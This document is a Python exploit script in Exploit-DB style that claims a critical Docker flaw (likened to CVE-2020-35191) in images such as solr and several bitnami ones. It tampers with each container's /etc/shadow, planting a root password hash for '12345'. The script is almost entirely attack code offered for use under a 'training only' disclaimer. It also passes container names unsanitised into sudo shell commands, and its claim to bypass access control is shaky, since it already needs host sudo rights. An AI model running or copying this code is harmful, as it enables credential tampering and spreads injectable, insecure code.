# This project is exploit for some docker containers with similar to vulnerability code: CVE-2020-35191

# ===>Important:
# Exploit Title: Docker - Shadow File - Broken Authentication
# Date: 2021-12-03 (03 Dec 2021)
# Exploit Author: MegadimeneX
# Vendor Homepage: https://github.com/megadimenex/MegaHiDocker
# -----------------------------------------------------
# Software name: kasmweb/core-nvidia-focal
# Version: Ex-versions until "develop-rolling"
# Software Link: https://hub.docker.com/r/kasmweb/core-nvidia-focal
# -----------------------------------------------------
# Software name: solr
# Version: Ex-versions until now ("latest")
# Software Link: https://hub.docker.com/_/solr
# -----------------------------------------------------
# Software name: bitnami/phppgadmin:
# Version: Ex-versions until "7.13.0-debian-10-r375"
# Software Link: https://hub.docker.com/r/bitnami/phppgadmin
# -----------------------------------------------------
# Software name: bitnami/cassandra
# Version: Ex-versions until "4.0.1-debian-10-r94"
# Software Link: https://hub.docker.com/r/bitnami/cassandra
# -----------------------------------------------------
# Software name: bitnami/prometheus
# Version: Ex-versions until "2.32.0-debian-10-r0"
# Software Link: https://hub.docker.com/r/bitnami/prometheus
# -----------------------------------------------------
# Software name: bitnami/alertmanager
# Version: Ex-versions until "0.23.0-debian-10-r108"
# Software Link: https://hub.docker.com/r/bitnami/alertmanager
# -----------------------------------------------------
# Software name: bitnami/geode
# Version: Ex-versions until"1.14.1-debian-10-r4"
# Software Link: https://hub.docker.com/r/bitnami/geode
# -----------------------------------------------------
# Tested on: Linux/Ubuntu
# The Reference of Vulnerability Same: https://nvd.nist.gov/vuln/detail/CVE-2020-35191

# ===>The Impact Of Vulnerability:
# 1.CVSS =================================> 9.8 Critical
# 2.Impact Code execution ================> True
# 3.Impact Denial of Service =============> True
# 4.Impact Escalation of Privileges ======> True
# 5.Impact Information Disclosure ========> True
# 6.Affected Component ===================> /etc/shadow

# ===>Description:
# 1.This simple code is for training only And no responsibility rests with the creator of this code\
# The docker containers mentioned in the example are real\
# The relevant vendors have been given vulnerability alerts\
# But this has not been fixed until the release of this code.
# 2.Password default is: 12345
# 3.Path file: /home/shadow-<containerID>

# ===>Requirement:
# 1.Need to Install docker in your Linux AND Install subprocess module for python 3.X.
# 2.You need pull the your containers and next run this code(e.g: docker pull <your container>)

# ===>Instructions:
# 1.This code is only applied for containers that can be accessed to its environment using the Command below\
# but its root access is locked.
# 2."sudo docker exec -ti <your containerID has shown in result> /bin/bash"
# 3.And in environment, type "su -" and type password by default: 12345
# 4.After run For one name of container, press 1 and enter name of container. e.g: bitnami/alertmanager
# 5.If you have a list name of containers, press 2 and enter a text file address, with this format e.g:
# bitnami/cassandra
# bitnami/alertmanager
# bitnami/prometheus

# ===>Suggestion:
# You can use for this code, with other modules e.g: "Docker SDK" - link: https://docker-py.readthedocs.io/en/latest/

import subprocess


def inputname():
    q = int(input('Please enter a number (1.One name 2.More Name): '))
    if q == 1:
        qname = str(input('Please enter your docker name: '))
        comdocker(qname)
    elif q == 2:
        qname = input('Please enter your file: ')
        openfile = open(qname, 'r+')
        for dockername in openfile:
            comdocker(dockername)
    else:
        err = 'Please enter a correct number'
        myprint('Error =', err)
    return


def comdocker(name):
    com = f'sudo docker run -d {name}'
    proccom = process(com)
    findcontainerid = f'{proccom}'[:12]
    myprint('ContainerID =', findcontainerid)
    inserter(findcontainerid)
    myprint(f'{name} =============>', "it's done")
    return


def inserter(containerid):
    hshadd = f'/home/shadow-{containerid}'
    dshadd = '/etc/shadow'
    com = f'sudo docker cp {containerid}:{dshadd} {hshadd}'
    myprint('Path file is =', hshadd)
    process(com)
    compass = 'sudo openssl passwd -1 12345'
    proccompass = process(compass)
    permission(755, hshadd)
    openfile = open(hshadd)
    readfile = openfile.read()
    ofile = readfile.replace("*", f"{proccompass}", 1).replace("\n", "", 1)
    openfile.close()
    openfile = open(hshadd, 'w')
    openfile.write(ofile)
    openfile.close()
    permission(640, hshadd)
    com1 = f'sudo docker cp {hshadd} {containerid}:{dshadd}'
    process(com1)
    com2 = f'sudo docker cp {hshadd} {containerid}:{dshadd}-'
    process(com2)
    openfile.close()
    return


def permission(num, add):
    com = f'sudo chmod {num} {add}'
    process(com)
    return


def process(payload):
    pay = subprocess.run(payload, shell=True, timeout=15, stdout=subprocess.PIPE).stdout.decode('utf-8')
    myprint('Done!', pay)
    return pay


def myprint(namevar, valuevar):
    print(f'{namevar}', valuevar)
    return


inputname()
